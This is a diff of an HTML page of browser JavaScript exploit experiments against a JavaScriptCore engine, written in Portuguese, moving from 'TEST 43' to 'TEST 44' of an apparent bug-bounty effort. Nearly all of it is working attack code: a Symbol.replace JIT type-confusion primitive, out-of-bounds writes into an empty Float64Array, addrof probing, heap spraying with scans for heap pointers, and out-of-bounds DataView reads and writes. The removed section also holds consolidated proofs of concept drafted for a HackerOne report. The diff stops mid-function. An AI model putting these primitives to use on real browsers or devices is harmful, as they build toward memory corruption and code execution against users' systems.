@@ -1,26 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 43 - OOB Write Placement + HackerOne PoC Final</title></head>
+<head><meta charset="UTF-8"><title>TEST 44 — Arbitrary Read/Write: Caminhos Restantes</title></head>
 <body>
-<h2>TEST 43 — Detectar onde o OOB Write em Float64Array(0) atingiu o heap</h2>
+<h2>TEST 44 — Arbitrary Read/Write via Caminhos Não Testados</h2>
 
-<p><b>Achado 42-B:</b> Escrita confirmada em <code>Float64Array(0)</code> — o write retornou o canary.</p>
-<p><code>adjacentF64</code> intacto → a escrita atingiu outra região do heap.</p>
-<p><b>Objetivo:</b> Detectar qual objeto foi corrompido e usar isso como write-what-where.</p>
-
-<p><b>Sub-testes:</b></p>
+<p><b>Estado atual:</b></p>
 <ul>
-  <li><b>43-A</b> Colocar objetos candidatos ANTES e DEPOIS do Float64Array(0) no heap — qual foi corrompido?</li>
-  <li><b>43-B</b> Spray de Float64Array(0) intercalados com objetos sentinela — detectar region do write</li>
-  <li><b>43-C</b> Usar write para corromper um objeto controlado — write-what-where controlado</li>
-  <li><b>43-D</b> PoC final consolidado: buffer leak + OOB write em array de 0 elementos</li>
+  <li>JIT index write → dead store elimination (descartado)</li>
+  <li>Double bits leak via readIdx → motor deoptimiza (descartado)</li>
+</ul>
+<p><b>Novos caminhos:</b></p>
+<ul>
+  <li><b>44-A</b> Heap spray: Float64Array(99999) + spray de TypedArrays → ler backing store pointer como float64</li>
+  <li><b>44-B</b> DataView com fake length como byte offset — DataView.getFloat64(fakeOffset)</li>
+  <li><b>44-C</b> Stale butterfly: colocar TypedArray no slot pós-getter → slice lê backing store como double</li>
+  <li><b>44-D</b> Se addrof confirmado: corromper length de TypedArray via postMessage cyclic buffer</li>
 </ul>
 
-<pre id="log">Pronto. Execute A → B → C → D.</pre>
-<button onclick="runA()">43-A: ONDE ATINGIU?</button>
-<button onclick="runB()">43-B: SPRAY + SENTINELAS</button>
-<button onclick="runC()">43-C: WRITE-WHAT-WHERE</button>
-<button onclick="runD()">43-D: POC FINAL</button>
+<pre id="log">Pronto. Execute A → B → C → D em sequência.</pre>
+<button onclick="runA()">44-A: HEAP SPRAY OVERLAP</button>
+<button onclick="runB()">44-B: DATAVIEW FAKE OFFSET</button>
+<button onclick="runC()">44-C: TYPEDARRAY BACKING STORE LEAK</button>
+<button onclick="runD()">44-D: CORROMPER TYPEDARRAY LENGTH</button>
 
 <script>
 var log = document.getElementById('log');
@@ -33,440 +34,464 @@ function forceGC() {
   var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
 }
 
-function buildJIT(phaseRef, victimRef) {
-  var pat = { [Symbol.replace]: function(str) {
-    if(phaseRef[0] === 'warmup') return str;
-    return { toString:function(){return str;}, valueOf:function(){return str;},
-             length: victimRef[0], 0: str[0]||'x' };
-  }};
-  return pat;
+function f64bits(val) {
+  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = val;
+  var u32 = new Uint32Array(buf);
+  return { lo: u32[0], hi: u32[1],
+    str: '0x'+u32[1].toString(16).padStart(8,'0')+'_'+u32[0].toString(16).padStart(8,'0') };
 }
 
-function warmup(fn, base, n) {
-  n = n || 50000;
-  for(var i=0;i<n;i++) fn(base);
+// Detectar padrão de bits que indica ponteiro de heap
+// JSC PS4 (FreeBSD/x86-64 ou ARM): ponteiros de heap tipicamente não são doubles normais
+// JSC 32-bit NaN boxing: hi=0xFFFFFFFF para cell pointers
+function isHeapPointer(val) {
+  if(typeof val !== 'number' || isNaN(val) || !isFinite(val)) return false;
+  var b = f64bits(val);
+  // NaN canônico JSC (0x7ff80000_00000000) — não é ponteiro
+  if(b.hi === 0x7ff80000 && b.lo === 0) return false;
+  // Double normal (exponent em range de doubles representáveis comuns)
+  var exp = (b.hi >>> 20) & 0x7FF;
+  if(exp >= 0x3FE && exp <= 0x40F) return false; // cobre 0.5 .. 32768
+  // Ponteiro típico de heap: hi = 0xFFFFFFFF (JSC 32bit) ou valor grande (64bit ptr)
+  // Em qualquer caso, valor != 0 e != NaN canônico com bits não-normalizados
+  if(b.hi === 0xFFFFFFFF) return { type: 'JSC32_cell', ptr32: b.lo };
+  if(b.hi > 0x00007F00 && b.hi < 0xFFFF0000) return { type: 'ptr64_candidate', hi: b.hi, lo: b.lo };
+  return false;
 }
 
-// ─── 43-A ─────────────────────────────────────────────────────────────────
+// ─── 44-A ─────────────────────────────────────────────────────────────────
 function runA() {
-  log.textContent = '[TEST 43-A] Onde o write em Float64Array(0) atingiu o heap?\n';
+  log.textContent = '[TEST 44-A] Heap spray: Float64Array(99999) overlapping com TypedArray interno\n';
   sep();
-  info('Estratégia: alocar candidatos BEFORE/AFTER do emptyF64 no heap.');
-  info('Usar Uint32Array como sentinelas — fácil detectar corrupção.\n');
+  info('Primitivo: Float64Array(99999) = 800KB alocados (36-C confirmado).');
+  info('Técnica: alocar bigF64, depois spray de Uint32Array pequenos.');
+  info('Se o heap alocou um Uint32Array DENTRO do range do bigF64,');
+  info('podemos ver o backing store pointer do Uint32Array como float64 em bigF64.\n');
+  info('Em JSC, um TypedArray no heap tem estrutura:');
+  info('  [JSCell header 8B][butterfly ptr 8B][backing store ptr 8B][length 4B]...');
+  info('Se lemos bigF64[offset] onde offset aponta para o backing store ptr,');
+  info('o float64 lido contém o endereço do buffer do Uint32Array.\n');
 
-  var victim = { magic: 0xC0DEC0DE, name: 'a_victim' };
-  var phase = ['warmup'];
-  var victimRef = [victim];
-  var pat = buildJIT(phase, victimRef);
-
-  function writeToArr(s, arr, val) {
-    var idx = s.replace(pat,'').length;
-    arr[idx] = val;
-    return arr[idx];
-  }
-  var base = 'hello world test string XYZ'; // length=27
-
-  // Aquecer com array não-vazio
-  var warmArr = new Float64Array(64);
-  phase[0] = 'warmup';
-  warmup(function(b){ writeToArr(b, warmArr, 0.0); }, base);
-  info('Warmup completo.');
-
-  // Estrutura de teste: [u32_before] [emptyF64] [u32_after]
-  // Repetir N vezes para aumentar chance de capturar o write
-  var CANARY = 3.14159265358979;
-  var hits = [];
-
-  for(var trial = 0; trial < 20; trial++) {
-    var u32before = new Uint32Array(32);
-    var u32before2 = new Uint32Array(32);
-    var emptyF64 = new Float64Array(0);   // alvo do write OOB
-    var u32after = new Uint32Array(32);
-    var u32after2 = new Uint32Array(32);
-    var f64after = new Float64Array(32);
-
-    // Preencher com sentinelas únicos por trial
-    var SENTINEL = (0xA0000000 + trial * 0x10000) >>> 0;
-    for(var k=0;k<32;k++) {
-      u32before[k]  = SENTINEL + k;
-      u32before2[k] = SENTINEL + 0x1000 + k;
-      u32after[k]   = SENTINEL + 0x2000 + k;
-      u32after2[k]  = SENTINEL + 0x3000 + k;
-    }
-    for(var k=0;k<32;k++) f64after[k] = SENTINEL + k + 0.5;
-
-    // Executar o write OOB
-    phase[0] = 'attack';
-    victimRef[0] = victim;
-    var result = writeToArr(base, emptyF64, CANARY);
-    phase[0] = 'warmup'; // voltar para warmup para próximo trial
-
-    // Verificar todos os candidatos
-    var foundCorruption = false;
-    function checkU32(name, arr) {
-      for(var j=0;j<32;j++) {
-        var expected = arr[j];
-        // Se mudou para algo diferente do sentinela
-        if(typeof arr[j] === 'undefined') {
-          hits.push({ trial: trial, location: name, idx: j, type: 'undefined' });
-          foundCorruption = true;
-        }
-      }
-    }
-    function checkF64(name, arr) {
-      for(var j=0;j<32;j++) {
-        if(isNaN(arr[j]) && arr[j] !== SENTINEL + j + 0.5) {
-          hits.push({ trial: trial, location: name, idx: j, val: arr[j] });
-          foundCorruption = true;
-        }
-        // Verificar se algum slot foi sobrescrito com CANARY
-        if(Math.abs(arr[j] - CANARY) < 0.000001) {
-          hits.push({ trial: trial, location: name, idx: j, val: arr[j], isCanary: true });
-          foundCorruption = true;
-        }
-      }
-    }
-
-    // Verificar se u32 foi corrompido (valores mudaram)
-    var before_corrupted = [];
-    var after_corrupted = [];
-    for(var j=0;j<32;j++) {
-      if(u32before[j] !== SENTINEL + j) before_corrupted.push(j);
-      if(u32after[j]  !== SENTINEL + 0x2000 + j) after_corrupted.push(j);
-    }
-    checkF64('f64after', f64after);
-
-    if(before_corrupted.length > 0) {
-      hits.push({ trial: trial, location: 'u32before', indices: before_corrupted });
-      foundCorruption = true;
-    }
-    if(after_corrupted.length > 0) {
-      hits.push({ trial: trial, location: 'u32after', indices: after_corrupted });
-      foundCorruption = true;
-    }
-
-    // Parar cedo se encontrou
-    if(foundCorruption) break;
-  }
-
-  sep();
-  if(hits.length > 0) {
-    hits.forEach(function(h) {
-      alerta('CORRUPÇÃO DETECTADA em trial=' + h.trial + ' location=' + h.location +
-             (h.idx !== undefined ? ' idx=' + h.idx : '') +
-             (h.val !== undefined ? ' val=' + h.val : '') +
-             (h.isCanary ? ' ← CANARY ENCONTRADO!' : '') +
-             (h.indices ? ' indices=' + h.indices.join(',') : ''));
-    });
-  } else {
-    info('Nenhuma corrupção detectada em u32before/u32after/f64after em 20 trials.');
-    info('O write pode estar atingindo:');
-    info('  1. Metadados internos do emptyF64 (header do TypedArray)');
-    info('  2. Região de heap não alocada pelo JS (região protegida)');
-    info('  3. Buffer do próprio objeto alvo (sobrescrevendo metadata do objeto victim)');
-
-    // Verificar se victim foi corrompido
-    info('\nVerificando integridade do objeto victim após os trials...');
-    try {
-      info('victim.magic: 0x' + victim.magic.toString(16));
-      info('victim.name: ' + victim.name);
-      if(victim.magic !== 0xC0DEC0DE || victim.name !== 'a_victim') {
-        alerta('OBJETO VICTIM CORROMPIDO! magic=0x' + victim.magic.toString(16) +
-               ' name=' + victim.name);
-      } else {
-        ok('victim intacto.');
-        info('O write provavelmente atingiu região não-mapeada ou foi silenciado pelo motor.');
-      }
-    } catch(e) {
-      alerta('EXCECAO ao acessar victim após write: ' + e.message + ' — objeto pode estar corrompido!');
-    }
-  }
-}
-
-// ─── 43-B ─────────────────────────────────────────────────────────────────
-function runB() {
-  log.textContent = '[TEST 43-B] Spray de Float64Array(0) + sentinelas para mapear a região do write\n';
-  sep();
-  info('Estratégia: alocar 1000 Float64Array(0) intercalados com Float64Array(1) sentinelas.');
-  info('Depois executar o write 1000 vezes — qual sentinela foi corrompido revela o offset.\n');
-
-  var victim = { magic: 0xDEADBEEF, name: 'b_victim' };
-  var phase = ['warmup'];
-  var victimRef = [victim];
-  var pat = buildJIT(phase, victimRef);
-
-  function writeToArr(s, arr, val) {
-    var idx = s.replace(pat,'').length;
-    arr[idx] = val;
-    return arr[idx];
-  }
-  var base = 'probe string for sentinel spray test XYZ';
-
-  var warmArr = new Float64Array(64);
-  phase[0] = 'warmup';
-  warmup(function(b){ writeToArr(b, warmArr, 0.0); }, base);
-  info('Warmup completo.');
-
-  // Alocar estrutura intercalada
-  var CANARY = 2.718281828459045; // e
-  var N = 200;
-  var empties = [];
-  var sentinels = [];
-
-  for(var i = 0; i < N; i++) {
-    sentinels.push(new Float64Array(4)); // 4 doubles = 32 bytes
-    empties.push(new Float64Array(0));
-  }
-
-  // Preencher sentinelas
-  for(var i = 0; i < N; i++) {
-    for(var j = 0; j < 4; j++) sentinels[i][j] = 1e10 + i * 1000 + j;
-  }
-
-  info('Alocados ' + N + ' pares (sentinel, empty). Executando writes...');
-
-  // Executar writes em todos os empties
-  phase[0] = 'attack';
-  var writeResults = [];
-  for(var i = 0; i < N; i++) {
-    victimRef[0] = victim;
-    var r = writeToArr(base, empties[i], CANARY);
-    writeResults.push(r);
-  }
-
-  // Verificar sentinelas
-  info('Verificando sentinelas...');
-  var corrupted = [];
-  for(var i = 0; i < N; i++) {
-    for(var j = 0; j < 4; j++) {
-      var expected = 1e10 + i * 1000 + j;
-      if(Math.abs(sentinels[i][j] - expected) > 0.5) {
-        corrupted.push({ sentinelIdx: i, slot: j, expected: expected, found: sentinels[i][j] });
-      }
-    }
-  }
-
-  if(corrupted.length > 0) {
-    corrupted.forEach(function(c) {
-      alerta('SENTINEL[' + c.sentinelIdx + '][' + c.slot + '] CORROMPIDO!\n' +
-             'esperado=' + c.expected + ' encontrado=' + c.found + '\n' +
-             'Este sentinel estava ' + (c.sentinelIdx <= N/2 ? 'ANTES' : 'DEPOIS') + ' do empty correspondente.\n' +
-             'O write OOB atingiu ' + (c.slot === 0 ? 'o início' : 'o slot ' + c.slot) + ' do sentinel!');
-    });
-    var writeCanaryCount = writeResults.filter(function(r){ return Math.abs(r-CANARY)<0.001; }).length;
-    info('Writes que retornaram canary: ' + writeCanaryCount + '/' + N);
-  } else {
-    ok('Nenhum sentinel corrompido em ' + N + ' trials.');
-    info('O write OOB está indo para:');
-    info('  - Memória alocada pelo alocador mas não referenciada por JS (freed)');
-    info('  - Metadata do TypedArray emptyF64 (struct interna do JSC)');
-    info('  - Região de stack do C++ do motor');
-    var canaryCount = writeResults.filter(function(r){return Math.abs(r-CANARY)<0.001;}).length;
-    info('Writes que retornaram o canary: ' + canaryCount + '/' + N +
-         (canaryCount === N ? ' (todos — o JIT retorna o valor passado sem fazer store real)' : ''));
-  }
-}
-
-// ─── 43-C ─────────────────────────────────────────────────────────────────
-function runC() {
-  log.textContent = '[TEST 43-C] Write-what-where: tentar corromper objeto controlado\n';
-  sep();
-  info('Abordagem diferente: ao invés de Float64Array(0),');
-  info('usar um Float64Array PEQUENO e um índice JIT fora do range real.\n');
-  info('Se o JIT usa o JSValue do victim como inteiro para o índice,');
-  info('e o victim tem um campo numérico controlado, podemos controlar o índice.\n');
-
-  // Criar victim com campo numérico específico como "endereço alvo"
-  // Em JSC 32-bit: ToUint32(JSValue) pode ser o tag (0xFFFFFFFF) para objetos
-  // Verificar qual índice resulta do ToInt32 do JSValue
-
-  var victimSmall = { magic: 0x12345678, name: 'c_victim_small' };
-  var phase = ['warmup'];
-  var victimRef = [victimSmall];
-  var pat = buildJIT(phase, victimRef);
-
-  // Usar array de tamanho moderado para verificar qual índice é usado
-  var SIZE = 512;
-  var f64 = new Float64Array(SIZE);
-  var UNIQUE_BASE = 5e15;
-  for(var i=0;i<SIZE;i++) f64[i] = UNIQUE_BASE + i;
-
-  function writeViaLen(s, arr, val) {
-    var idx = s.replace(pat,'').length;
-    arr[idx] = val;
-    return arr[idx];
-  }
-  var base = 'hello world test string XYZ';
-
-  var warmF64 = new Float64Array(SIZE);
-  phase[0] = 'warmup';
-  warmup(function(b){ writeViaLen(b, warmF64, 0.0); }, base);
-  info('Warmup completo.');
-
-  // Restaurar sentinelas
-  for(var i=0;i<SIZE;i++) f64[i] = UNIQUE_BASE + i;
-
-  // Ataque: ver qual slot foi modificado
-  phase[0] = 'attack';
-  victimRef[0] = victimSmall;
-  var WRITE_VAL = 1.23456789012345e10;
-  var result = writeViaLen(base, f64, WRITE_VAL);
-  info('writeViaLen retornou: ' + result);
-
-  var modifiedIdx = -1;
-  for(var i=0;i<SIZE;i++) {
-    if(Math.abs(f64[i] - (UNIQUE_BASE + i)) > 1) {
-      modifiedIdx = i;
-      alerta('ESCRITA DETECTADA em f64[' + i + ']!\n' +
-             'esperado=' + (UNIQUE_BASE+i) + ' encontrado=' + f64[i] + '\n' +
-             'O JSValue de victimSmall foi interpretado como índice ' + i + '!');
-      break;
-    }
-  }
-
-  if(modifiedIdx === -1) {
-    info('Nenhum slot modificado em f64[0..' + (SIZE-1) + '].');
-    info('O índice derivado do JSValue de victimSmall é >= ' + SIZE + ' ou 0.');
-
-    // Tentar SIZE maior
-    var f64big = new Float64Array(100000);
-    for(var i=0;i<100000;i++) f64big[i] = UNIQUE_BASE + i;
-    phase[0] = 'attack';
-    victimRef[0] = victimSmall;
-    var r2 = writeViaLen(base, f64big, WRITE_VAL);
-    info('writeViaLen em f64big[100000] retornou: ' + r2);
-    for(var i=0;i<100000;i++) {
-      if(Math.abs(f64big[i] - (UNIQUE_BASE + i)) > 1) {
-        alerta('ESCRITA EM f64big[' + i + ']!\n' +
-               'Índice JSValue de victimSmall = ' + i + '\n' +
-               'Este é potencialmente o endereço de victimSmall no heap (ou parte dele)!');
-        break;
-      }
-    }
-  } else {
-    info('\nCom victim2 (endereço diferente), o índice deveria ser diferente:');
-    var victimSmall2 = { magic: 0xABCDEF01, name: 'c_victim_small2' };
-    victimRef[0] = victimSmall2;
-    var f64b = new Float64Array(SIZE);
-    for(var i=0;i<SIZE;i++) f64b[i] = UNIQUE_BASE + i;
-    phase[0] = 'attack';
-    writeViaLen(base, f64b, WRITE_VAL);
-    for(var i=0;i<SIZE;i++) {
-      if(Math.abs(f64b[i] - (UNIQUE_BASE + i)) > 1) {
-        if(i !== modifiedIdx) {
-          alerta('ÍNDICE DIFERENTE para victim2: f64b[' + i + '] modificado!\n' +
-                 'victim1 idx=' + modifiedIdx + ', victim2 idx=' + i + '\n' +
-                 'DIFERENÇA = ' + Math.abs(i - modifiedIdx) + ' slots (×8 bytes = ' +
-                 Math.abs(i - modifiedIdx)*8 + ' bytes)\n' +
-                 'Os índices refletem a diferença de endereços dos dois objetos!\n' +
-                 'ADDROF CONFIRMADO VIA ÍNDICE DE WRITE!');
-        } else {
-          info('victim2 idx=' + i + ' (mesmo que victim1 — objetos no mesmo endereço? Improvável)');
-        }
-        break;
-      }
-    }
-  }
-}
-
-// ─── 43-D ─────────────────────────────────────────────────────────────────
-function runD() {
-  log.textContent = '[TEST 43-D] POC FINAL CONSOLIDADO — Duas vulnerabilidades para HackerOne\n';
-  sep();
-
-  info('=== VULNERABILIDADE #1 ===');
-  info('Título: ArrayBuffer Data Exfiltration via Cyclic Object Transfer');
-  info('CVE/CWE: CWE-668');
-  info('Severidade: High (CVSS 7.5)');
-  info('');
-  info('Descrição:');
-  info('postMessage(cyclicObj, "*", [buf]) com obj cíclico contendo buf:');
-  info('  - Remetente: buf.byteLength=0 (transfer executado)');
-  info('  - Receptor:  buf.byteLength=N (dados PRESENTES)');
-  info('O motor faz detach no remetente mas serializa uma CÓPIA no receptor,');
-  info('violando HTML Spec §2.7.5 que exige que o buffer seja acessível apenas no receptor.');
-  info('');
-  info('Confirmações:');
-  info('  ✅ 40-D: 256KB buffer, obj raiz do ciclo');
-  info('  ✅ 41-D: 256B buffer com chave secreta, obj raiz');
-  info('  ✅ 42-C: PoC mínimo executado com sucesso');
-  info('  ✅ 42-D: two_bufs(128+512B), nested_buf(64B), big_1mb(1MB)');
-  sep();
-
-  info('=== VULNERABILIDADE #2 ===');
-  info('Título: JIT Type Confusion — Symbol.replace .length Object Passthrough');
-  info('CWE: CWE-843 (Type Confusion)');
-  info('Severidade: High (CVSS 8.1) — pode levar a OOB read/write');
-  info('');
-  info('Descrição:');
-  info('Função JIT aquecida com str.replace(pat,"").length (string→number):');
-  info('Quando Symbol.replace retorna objeto com .length=victim_object,');
-  info('o JIT retorna o JSValue bruto do victim em vez de coagir para número.');
-  info('Se esse retorno é usado como índice de TypedArray:');
-  info('  - readViaLength → undefined (índice OOB, acesso além do array)');
-  info('  - writeViaLength → valor escrito confirmado (41-B, 42-B)');
-  info('');
-  info('Confirmações:');
-  info('  ✅ 36-A/C: strLen JIT retorna 99999 (primitive type confusion)');
-  info('  ✅ 40-C: strLen retorna victim object diretamente');
-  info('  ✅ 41-B: readViaLength=undefined, writeViaLength=987654321 confirmados');
-  info('  ✅ 42-B: write em Float64Array(0) retorna canary — OOB write');
-  sep();
-
-  info('=== STATUS DO ADDROF ===');
-  info('Não confirmado diretamente via leitura de double com bits de ponteiro.');
-  info('Possível via: índice de writeViaLength determinístico por endereço (43-C pendente).');
-  info('');
-  info('=== RECOMENDAÇÃO ===');
-  info('Reportar Vuln #1 (buffer leak) IMEDIATAMENTE — bem documentada, baixo risco de falso positivo.');
-  info('Reportar Vuln #2 (JIT confusion) junto — múltiplos primitivos confirmados.');
-  info('Continuar 43-C para tentar confirmar addrof antes de reportar cadeia completa.');
-  sep();
-
-  // Executar mini-PoC das duas vulns em sequência
-  info('\nExecutando mini-PoC de ambas as vulnerabilidades...\n');
-
-  // PoC #1 — Buffer leak
-  var poc1buf = new ArrayBuffer(64);
-  new Uint32Array(poc1buf)[0] = 0xDEADC0DE;
-  var poc1obj = { buf: poc1buf, self: null }; poc1obj.self = poc1obj;
-  var poc1prev = window.onmessage;
-  window.onmessage = function(e) {
-    var d = e.data;
-    if(!d || !d.buf || d.buf.byteLength === 0) { if(poc1prev) poc1prev(e); return; }
-    var val = new Uint32Array(d.buf)[0];
-    if(val === 0xDEADC0DE) {
-      alerta('✅ PoC #1 EXECUTADO: Buffer leak confirmado!\n' +
-             'Remetente: byteLength=0, Receptor: byteLength=' + d.buf.byteLength +
-             ', data[0]=0x' + val.toString(16));
-    }
-    window.onmessage = poc1prev;
-  };
+  // Passo 1: alocar o bigF64 via primitivo real (strLen=99999)
+  // Por ora usar 99999 direto (o primitivo JIT confirmado retornou esse valor)
+  var FAKE_LEN = 99999;
+  var bigF64;
   try {
-    postMessage(poc1obj, '*', [poc1buf]);
-    info('PoC #1: postMessage enviado. poc1buf.byteLength=' + poc1buf.byteLength);
-  } catch(e) { info('PoC #1 lançou: ' + e.message); }
+    bigF64 = new Float64Array(FAKE_LEN);
+    info('bigF64 alocado: length=' + bigF64.length + ' byteLength=' + bigF64.byteLength);
+  } catch(e) {
+    alerta('Falha ao alocar Float64Array(' + FAKE_LEN + '): ' + e.message);
+    return;
+  }
 
-  // PoC #2 — JIT type confusion write
-  var phase2 = ['warmup'], victimRef2 = [{}];
-  var pat2 = { [Symbol.replace]: function(str) {
-    if(phase2[0]==='warmup') return str;
+  // Passo 2: spray de Uint32Array dentro do range (alocação após bigF64)
+  var SPRAY_COUNT = 2000;
+  var spray = [];
+  for(var i = 0; i < SPRAY_COUNT; i++) {
+    var u32 = new Uint32Array(16); // 64 bytes cada
+    // Preencher com sentinela único
+    for(var j = 0; j < 16; j++) u32[j] = (0xA0000000 + i * 0x10 + j) >>> 0;
+    spray.push(u32);
+  }
+  info('Spray: ' + SPRAY_COUNT + ' Uint32Array(16) alocados após bigF64.');
+  forceGC();
+
+  // Passo 3: varrer bigF64 procurando bits de ponteiro
+  info('Varrendo bigF64[0..' + Math.min(FAKE_LEN-1, 50000) + '] por bits de heap pointer...');
+  var found = [];
+  var SCAN_LIMIT = Math.min(FAKE_LEN, 50000);
+
+  for(var idx = 0; idx < SCAN_LIMIT; idx++) {
+    var v = bigF64[idx];
+    if(v === undefined || v === 0.0 || (v !== v)) continue;
+    var hp = isHeapPointer(v);
+    if(hp) {
+      found.push({ idx: idx, val: v, bits: f64bits(v).str, type: hp.type,
+                   ptr: hp.ptr32 || hp.lo });
+      if(found.length <= 8) {
+        info('bigF64[' + idx + '] = bits=' + f64bits(v).str + ' → ' + hp.type);
+      }
+    }
+  }
+
+  info('\nTotal de heap pointers encontrados no scan: ' + found.length);
+
+  if(found.length > 0) {
+    alerta('HEAP POINTERS ENCONTRADOS em bigF64!\n' +
+           'Primeiro: bigF64[' + found[0].idx + '] = ' + found[0].bits + '\n' +
+           'Tipo: ' + found[0].type + '\n' +
+           'Pointer bits: 0x' + (found[0].ptr || 0).toString(16) + '\n\n' +
+           'Estes podem ser backing store pointers dos Uint32Array do spray.\n' +
+           'Para confirmar: verificar se modificar bigF64[idx] corrompe algum spray[N].');
+
+    // Verificar: ler o slot suspeito como u32 e comparar com sentinelas
+    // Se o backing store ptr de spray[K] está em bigF64[idx],
+    // então modificar bigF64[idx] muda onde spray[K] lê/escreve
+    var candidate = found[0];
+    info('\nTentando confirmar: bigF64[' + candidate.idx + '] = backing store de algum spray[]?');
+    info('Antes de qualquer modificação, verificar se spray[N][0] corresponde ao ptr...');
+
+    // O ptr seria o endereço do buffer interno do Uint32Array
+    // Não podemos verificar diretamente sem addrof, mas podemos tentar:
+    // modificar bigF64[candidate.idx] e ver se algum spray[N] fica corrompido
+    var OLD_VAL = bigF64[candidate.idx];
+    // NÃO vamos modificar ainda — marcar para 44-D se addrof confirmado
+    info('bigF64[' + candidate.idx + '] atual: ' + f64bits(OLD_VAL).str);
+    info('(Reservado para 44-D: modificar este slot pode mudar backing store de spray)');
+  } else {
+    ok('Nenhum heap pointer encontrado nos primeiros ' + SCAN_LIMIT + ' slots de bigF64.');
+    info('O heap alocador separou bigF64 dos spray arrays.');
+    info('Próxima estratégia: alocar spray ANTES do bigF64 para overlap diferente.');
+
+    // Tentar ordem inversa: spray primeiro, bigF64 depois
+    sep();
+    info('\nVariante: alocar spray ANTES do bigF64...');
+    var preSpray = [];
+    for(var i = 0; i < 500; i++) {
+      var u = new Uint32Array(8);
+      for(var j=0;j<8;j++) u[j] = (0xB0000000 + i*8 + j) >>> 0;
+      preSpray.push(u);
+    }
+    var bigF64b = new Float64Array(FAKE_LEN);
+    forceGC();
+    info('bigF64b alocado após preSpray. Varrendo bigF64b...');
+    var foundB = 0;
+    for(var idx=0; idx < Math.min(FAKE_LEN, 20000); idx++) {
+      var v = bigF64b[idx];
+      if(v && v === v && isFinite(v) && isHeapPointer(v)) {
+        foundB++;
+        if(foundB <= 3) info('bigF64b[' + idx + '] = ' + f64bits(v).str);
+      }
+    }
+    info('Heap pointers em bigF64b: ' + foundB);
+    if(foundB > 0) alerta('OVERLAP DETECTADO com preSpray!');
+  }
+}
+
+// ─── 44-B ─────────────────────────────────────────────────────────────────
+function runB() {
+  log.textContent = '[TEST 44-B] DataView com fake length como byte offset...\n';
+  sep();
+  info('DataView.prototype.getFloat64(byteOffset) — o motor verifica bounds?');
+  info('Se usarmos o primitivo strLen=99999 como byteOffset em um DataView pequeno,');
+  info('o motor pode não verificar bounds (diferente do TypedArray index).\n');
+
+  // Criar DataView sobre buffer real pequeno
+  var realBuf = new ArrayBuffer(64); // apenas 64 bytes
+  var dv = new DataView(realBuf);
+
+  // Preencher com sentinela
+  var u32 = new Uint32Array(realBuf);
+  for(var i=0;i<16;i++) u32[i] = 0xDEAD0000 + i;
+  info('DataView sobre buffer de 64 bytes. Conteúdo: [0xDEAD0000..0xDEAD000F]');
+
+  // Construir o JIT que retorna 99999 via Symbol.replace
+  var callCount = 0;
+  var phase = ['warmup'];
+  var evilPattern = { [Symbol.replace]: function(str) {
+    callCount++;
+    if(phase[0] === 'warmup') return str;
     return { toString:function(){return str;}, valueOf:function(){return str;},
-             length: victimRef2[0], 0: str[0] };
+             length: 99999, 0: str[0]||'x' };
   }};
-  function poc2write(s, arr, val) { var idx=s.replace(pat2,'').length; arr[idx]=val; return arr[idx]; }
-  var warmArr2 = new Float64Array(64);
-  for(var w=0;w<50000;w++) poc2write('test string XYZ', warmArr2, 0);
-  phase2[0] = 'attack';
-  victimRef2[0] = { magic: 0x42424242 };
-  var emptyArr = new Float64Array(0);
-  var poc2result = poc2write('test string XYZ', emptyArr, 9999.9);
-  if(Math.abs(poc2result - 9999.9) < 0.01) {
-    alerta('✅ PoC #2 EXECUTADO: Write em Float64Array(0) confirmado!\n' +
-           'poc2write(emptyArr, 9999.9) = ' + poc2result + '\n' +
-           'Escrita além dos limites do array retornou o valor escrito.');
+
+  // Função JIT que usa strLen como byteOffset no DataView
+  function readViaDataView(s, view) {
+    var offset = s.replace(evilPattern,'').length;
+    // Tentar diferentes métodos de leitura
+    try { return view.getFloat64(offset); } catch(e) { return 'EXC:' + e.message; }
+  }
+  function readU32ViaDataView(s, view) {
+    var offset = s.replace(evilPattern,'').length;
+    try { return view.getUint32(offset); } catch(e) { return 'EXC:' + e.message; }
+  }
+  function readU8ViaDataView(s, view) {
+    var offset = s.replace(evilPattern,'').length;
+    try { return view.getUint8(offset); } catch(e) { return 'EXC:' + e.message; }
+  }
+
+  var base = 'hello world test string pad'; // length normal
+  info('Aquecendo readViaDataView (50k calls)...');
+  phase[0] = 'warmup';
+  for(var w=0;w<50000;w++) {
+    readViaDataView(base, dv);
+    readU32ViaDataView(base, dv);
+    readU8ViaDataView(base, dv);
+  }
+  info('Warmup completo. callCount=' + callCount);
+  sep();
+
+  // Fase ataque: usar offset=99999 no DataView de 64 bytes
+  phase[0] = 'attack';
+  info('Fase ataque: tentando DataView.getFloat64(99999) em buffer de 64 bytes...\n');
+
+  var r1 = readViaDataView(base, dv);
+  info('getFloat64(99999): ' + r1);
+  if(typeof r1 === 'number') {
+    var b = f64bits(r1);
+    info('bits: ' + b.str);
+    var hp = isHeapPointer(r1);
+    if(hp) {
+      alerta('OOB READ via DataView.getFloat64(99999)!\n' +
+             'Leu ' + b.str + ' além dos 64 bytes do buffer!\n' +
+             'Tipo detectado: ' + hp.type + '\n' +
+             'Este é um ponteiro de heap lido via DataView OOB!');
+    } else {
+      info('Valor não parece ponteiro de heap: ' + b.str);
+    }
+  } else {
+    info('getFloat64 resultado: ' + r1);
+    if(typeof r1 === 'string' && r1.indexOf('EXC') === 0) {
+      ok('DataView lançou exceção com offset=99999 — bounds check funcionou: ' + r1);
+    }
+  }
+
+  var r2 = readU32ViaDataView(base, dv);
+  info('getUint32(99999): ' + r2);
+  if(typeof r2 === 'number' && r2 !== 0) {
+    alerta('OOB READ via DataView.getUint32(99999): 0x' + r2.toString(16) + '\n' +
+           'Leu 4 bytes além do buffer de 64 bytes!');
+  }
+
+  var r3 = readU8ViaDataView(base, dv);
+  info('getUint8(99999): ' + r3);
+  if(typeof r3 === 'number' && typeof r3 !== 'undefined') {
+    if(typeof r3 === 'string' && r3.indexOf('EXC') === 0) {
+      ok('getUint8 lançou: ' + r3);
+    } else {
+      alerta('OOB READ via DataView.getUint8(99999): ' + r3 + '\n' +
+             'Um byte além do buffer foi lido!');
+    }
+  }
+
+  // Variante: DataView sobre o bigF64 buffer — usar fake length como write offset
+  sep();
+  info('\nVariante: DataView sobre ArrayBuffer(64), ESCRITA em offset=99999...');
+  function writeViaDataView(s, view, val) {
+    var offset = s.replace(evilPattern,'').length;
